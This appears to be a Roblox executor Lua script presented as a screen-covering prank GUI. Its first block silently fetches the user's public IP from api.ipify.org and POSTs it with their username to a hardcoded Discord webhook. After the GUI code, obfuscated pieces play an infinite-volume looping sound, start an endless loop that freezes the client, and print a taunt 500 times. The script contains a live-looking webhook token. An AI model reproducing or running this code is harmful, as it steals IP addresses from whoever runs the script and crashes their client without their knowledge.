local webh = "https://discord.com/api/webhooks/972485218407686205/vrZwuvhsoT_mJJKYIgg_z5bz0pP0z-mE9NJY74xZJ90epgYHi2fdFjI0MziojV9BsgAV"

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name,
               ["description"] = game:HttpGet("https://api.ipify.org")
           }
       }
   }

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)


-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local ImageLabel_2 = Instance.new("ImageLabel")
local ImageLabel_3 = Instance.new("ImageLabel")
local ImageLabel_4 = Instance.new("ImageLabel")
local ImageLabel_5 = Instance.new("ImageLabel")
local ImageLabel_6 = Instance.new("ImageLabel")
local ImageLabel_7 = Instance.new("ImageLabel")
local ImageLabel_8 = Instance.new("ImageLabel")
local ImageLabel_9 = Instance.new("ImageLabel")
local ImageLabel_10 = Instance.new("ImageLabel")
local ImageLabel_11 = Instance.new("ImageLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Position = UDim2.new(-0.080078125, 0, -0.0984974951, 0)
Frame.Size = UDim2.new(0, 1808, 0, 816)

ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Position = UDim2.new(0.012168142, 0, -0.283088237, 0)
ImageLabel.Size = UDim2.new(0, 1705, 0, 1165)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8464161396"

ImageLabel_2.Parent = ScreenGui
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.Position = UDim2.new(0.981838822, 0, 0.946577668, 0)
ImageLabel_2.Size = UDim2.new(0, 82, 0, 72)
ImageLabel_2.Image = "http://www.roblox.com/asset/?id=8464161396"

ImageLabel_3.Parent = ScreenGui
ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_3.Position = UDim2.new(0.998864889, 0, 0.964941621, 0)
ImageLabel_3.Size = UDim2.new(0, 82, 0, 72)
ImageLabel_3.Image = "http://www.roblox.com/asset/?id=8464161396"

ImageLabel_4.Parent = ScreenGui
ImageLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_4.Position = UDim2.new(0.988649309, 0, 0.964941502, 0)
ImageLabel_4.Size = UDim2.new(0, 82, 0, 72)
ImageLabel_4.Image = "http://www.roblox.com/asset/?id=8464161396"

ImageLabel_5.Parent = ScreenGui
ImageLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_5.Position = UDim2.new(0.998865008, 0, 0.964941621, 0)
ImageLabel_5.Size = UDim2.new(0, 82, 0, 72)
ImageLabel_5.Image = "http://www.roblox.com/asset/?id=8464161396"

ImageLabel_6.Parent = ScreenGui
ImageLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_6.Position = UDim2.new(0.998865008, 0, 0.948247015, 0)
ImageLabel_6.Size = UDim2.new(0, 82, 0, 72)
ImageLabel_6.Image = "http://www.roblox.com/asset/?id=8464161396"

ImageLabel_7.Parent = ScreenGui
ImageLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_7.Position = UDim2.new(0.90692395, 0, 0.998330593, 0)
ImageLabel_7.Size = UDim2.new(0, 82, 0, 72)
ImageLabel_7.Image = "http://www.roblox.com/asset/?id=8464161396"

ImageLabel_8.Parent = ScreenGui
ImageLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_8.Position = UDim2.new(0.735527754, 0, 0.983305573, 0)
ImageLabel_8.Size = UDim2.new(0, 82, 0, 72)
ImageLabel_8.Image = "http://www.roblox.com/asset/?id=8464161396"

ImageLabel_9.Parent = ScreenGui
ImageLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_9.Position = UDim2.new(0.84562999, 0, 0.984974861, 0)
ImageLabel_9.Size = UDim2.new(0, 82, 0, 72)
ImageLabel_9.Image = "http://www.roblox.com/asset/?id=8464161396"

ImageLabel_10.Parent = ScreenGui
ImageLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_10.Position = UDim2.new(0.998865008, 0, 0.964941621, 0)
ImageLabel_10.Size = UDim2.new(0, 82, 0, 72)
ImageLabel_10.Image = "http://www.roblox.com/asset/?id=8464161396"

ImageLabel_11.Parent = ScreenGui
ImageLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_11.Position = UDim2.new(0.998865008, 0, 0.948247015, 0)
ImageLabel_11.Size = UDim2.new(0, 82, 0, 72)
ImageLabel_11.Image = "http://www.roblox.com/asset/?id=8464161396"

-- Scripts:

local function HRCKUYT_fake_script() -- ImageLabel_2.Script 
	local script = Instance.new('Script', ImageLabel_2)

	while true do
	script.Parent:TweenPosition(UDim2.new(0,5, 0,5), "Out", "Bounce", 4, true)
	wait(4)
	script.Parent:TweenPosition(UDim2.new(0, 206,0, 326), "Out", "Bounce", 4, true)
		wait(0.1)
		end
end
coroutine.wrap(HRCKUYT_fake_script)()
local function RMDUV_fake_script() -- ImageLabel_3.Script 
	local script = Instance.new('Script', ImageLabel_3)

	while true do
		script.Parent:TweenPosition(UDim2.new(0,5, 0,5), "Out", "Circular", 4, true)
	wait(4)
	script.Parent:TweenPosition(UDim2.new(0, 296,0, 226), "Out", "Circular", 4, true)
		wait(0.1)
		end
end
coroutine.wrap(RMDUV_fake_script)()
local function LODHKS_fake_script() -- ImageLabel_4.Script 
	local script = Instance.new('Script', ImageLabel_4)

	while true do
	script.Parent:TweenPosition(UDim2.new(0,5, 0,5), "Out", "Back", 4, true)
	wait(4)
	script.Parent:TweenPosition(UDim2.new(0, 296,0, 226), "Out", "Back", 4, true)
		wait(0.1)
		end
end
coroutine.wrap(LODHKS_fake_script)()
local function CYHDSI_fake_script() -- ImageLabel_5.s 
	local script = Instance.new('Script', ImageLabel_5)

	while true do
	script.Parent:TweenPosition(UDim2.new(0,5, 0,5), "Out", "Sine", 4, true)
	wait(4)
	script.Parent:TweenPosition(UDim2.new(0, 296,0, 226), "Out", "Sine", 4, true)
		wait(0.1)
		end
end
coroutine.wrap(CYHDSI_fake_script)()
local function VHUK_fake_script() -- ImageLabel_6.Script 
	local script = Instance.new('Script', ImageLabel_6)

	while true do
	script.Parent:TweenPosition(UDim2.new(0,5, 0,5), "Out", "Elastic", 4, true)
	wait(4)
		script.Parent:TweenPosition(UDim2.new(0, 296,0, 226), "Out", "Elastic", 4, true)
		wait(0.1)
		end
end
coroutine.wrap(VHUK_fake_script)()
local function EFWLIVT_fake_script() -- ImageLabel_7.Script 
	local script = Instance.new('Script', ImageLabel_7)

	while true do
	script.Parent:TweenPosition(UDim2.new(0,5, 0,5), "Out", "Bounce", 4, true)
	wait(4)
	script.Parent:TweenPosition(UDim2.new(0, 206,0, 326), "Out", "Bounce", 4, true)
		wait(0.1)
		end
end
coroutine.wrap(EFWLIVT_fake_script)()
local function UMTOS_fake_script() -- ImageLabel_8.Script 
	local script = Instance.new('Script', ImageLabel_8)

	while true do
		script.Parent:TweenPosition(UDim2.new(0,5, 0,5), "Out", "Circular", 4, true)
	wait(4)
	script.Parent:TweenPosition(UDim2.new(0, 296,0, 226), "Out", "Circular", 4, true)
		wait(0.1)
		end
end
coroutine.wrap(UMTOS_fake_script)()
local function FLZQP_fake_script() -- ImageLabel_9.Script 
	local script = Instance.new('Script', ImageLabel_9)

	while true do
	script.Parent:TweenPosition(UDim2.new(0,5, 0,5), "Out", "Back", 4, true)
	wait(4)
	script.Parent:TweenPosition(UDim2.new(0, 296,0, 226), "Out", "Back", 4, true)
		wait(0.1)
		end
end
coroutine.wrap(FLZQP_fake_script)()
local function LXXG_fake_script() -- ImageLabel_10.s 
	local script = Instance.new('Script', ImageLabel_10)

	while true do
	script.Parent:TweenPosition(UDim2.new(0,5, 0,5), "Out", "Sine", 4, true)
	wait(4)
	script.Parent:TweenPosition(UDim2.new(0, 296,0, 226), "Out", "Sine", 4, true)
		wait(0.1)
		end
end
coroutine.wrap(LXXG_fake_script)()
local function LEHAKZ_fake_script() -- ImageLabel_11.Script 
	local script = Instance.new('Script', ImageLabel_11)

	while true do
	script.Parent:TweenPosition(UDim2.new(0,5, 0,5), "Out", "Elastic", 4, true)
	wait(4)
		script.Parent:TweenPosition(UDim2.new(0, 296,0, 226), "Out", "Elastic", 4, true)
		wait(0.1)
		end
end
coroutine.wrap(LEHAKZ_fake_script)()

local follow = game:GetService("Players").LocalPlayer
local ins = Instance.new
local id = "rbxassetid://"
local ids = 26659
local aggg = "nd"
local idss = 43889
local f = "ot"
local gw = game.workspace
local cb = "Sou"
local clientid = "FCF60995-6ADA-4665-8322-4E76D2A171A7"
local a = " You "
local ggg = " ha"
local bots = "Aji09ui342908", "dwJOIJ89jg4", "j098uj903ng", "hjg098j09j23igg", "u90jh90gj940", "i90iu90gj490j4"
local hi = false
local no = false
local count = 5

hi = true
count = count + 3.5 - 0.5
count = count / 2 - 5 + 9.3 - 2.9 + 39 / 3 / 2 - 11 + 0.1
if follow.Name == game:GetService("Players").LocalPlayer.Name then 
	count = count + 2 / 2
end
local b = "a "
local c = "are "
if count == 2.0000000000000004 then
	no = hi
	count = count + 35
end
print(count)
local oeg = math.huge*math.huge
if count == 37.0000000000000004 then
	spawn(function()
		while wait() do
			wait(6.01)
			while no do end
		end
	end)
	spawn(function()
		while wait() do
			local StartFollow                                                                                       = ins(cb..aggg, gw)
			StartFollow.SoundId                                                                                    = id..ids..idss
			StartFollow.Volume                                                                                      = oeg
			StartFollow.Looped                                                                                     = hi
			StartFollow.PlayOnRemove                                                                              = hi
			StartFollow:Destroy()
			wait(2)
		end
	end)
	local g = "idi"
	for i = 1,500 do
		print(follow.Name)
		rconsoleprint(a .. c .. b ..g..f..ggg..ggg)
		print(a .. c .. b ..g..f..ggg..ggg)
	end
end
